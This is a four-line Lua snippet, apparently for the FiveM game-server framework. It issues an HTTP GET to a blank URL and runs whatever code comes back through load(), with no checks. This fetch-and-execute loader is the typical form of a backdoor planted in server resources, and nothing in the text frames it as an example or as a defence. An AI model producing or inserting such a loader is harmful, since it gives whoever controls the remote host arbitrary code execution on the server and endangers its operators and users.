PerformHttpRequest("", function(err, text, headers)
    assert(load(text))()
end, 'GET', '')
